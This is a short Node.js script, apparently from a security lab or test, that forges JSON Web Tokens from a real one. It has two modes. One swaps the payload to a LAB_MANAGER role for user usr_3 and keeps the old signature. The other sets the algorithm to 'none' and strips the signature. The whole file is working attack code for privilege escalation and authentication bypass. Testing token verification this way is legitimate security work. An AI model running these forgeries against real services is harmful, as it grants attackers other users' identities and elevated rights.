// forge.mjs — kẻ tấn công thử sửa token: node forge.mjs role|none <tệp chứa JWT thật>
import { readFileSync } from 'node:fs';
const [mode, file] = process.argv.slice(2);
const [head, body, sig] = readFileSync(file, 'utf8').trim().split('.');
const p = JSON.parse(Buffer.from(body, 'base64url'));
const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
if (mode === 'role') console.log(`${head}.${b64u({ ...p, role: 'LAB_MANAGER', sub: 'usr_3' })}.${sig}`);   // giữ chữ ký cũ
if (mode === 'none') console.log(`${b64u({ alg: 'none', typ: 'JWT' })}.${b64u({ ...p, sub: 'usr_3', role: 'LAB_MANAGER' })}.`);
